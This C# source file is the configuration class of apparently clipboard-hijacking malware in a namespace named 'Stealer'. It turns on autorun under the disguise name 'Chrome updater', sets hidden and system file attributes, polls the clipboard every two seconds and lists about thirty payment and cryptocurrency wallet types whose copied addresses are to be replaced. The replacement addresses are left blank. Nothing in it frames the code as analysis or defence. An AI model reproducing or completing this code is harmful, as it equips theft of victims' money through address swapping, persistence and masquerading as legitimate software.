using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stealer
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace to
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            // WebMoney
            {"wmr", "" },
            {"wmg", "" },
            {"wmz", "" },
            {"wmh", "" },
            {"wmu", "" },
            {"wmx", "" },

            // Qiwi
            {"qiwiua", "" }, // UA
            {"qiwiru", "" }, // RU

            // Yandex money
            {"yandex", "" },

            // Steam trade url
            {"steam", "" },

            // Cryptocurrency
            {"btc", "" }, // Bitcoin
            {"eth", "" }, // Ethereum
            {"xmr", "" }, // Monero
            {"xlm", "" }, // Stellar
            {"xrp", "" }, // Ripple
            {"ltc", "" }, // Litecoin
            {"nec", "" }, // Neocoin
            {"bch", "" }, // Bitcoin Cash
            {"bcn", "" }, // Bytecoin
            {"ada", "" }, // Cardano
            {"grft", "" }, // Graft
            {"zcash", ""}, // Zcash
            {"btg", "" },  // Bitcoin Gold
            {"waves", "" }, // Waves
            {"rdd", "" }, // ReddCoin
            {"blk", "" }, // BlackCoin
            {"emc", "" }, // Emercoin
            {"strat", "" }, // Stratis
            {"qtum", "" }, // Qtum
            {"via", "" }, // Viacoin
            {"lsk", "" }, // Lisk
            {"doge", "" }, // Dogecoin
            {"dash", "" } // Dashcoin
        };

        // Mutex (random)
        public static string mutex = "asuhdvaystdvytasdvtyasvdfctyasd";
    }
}
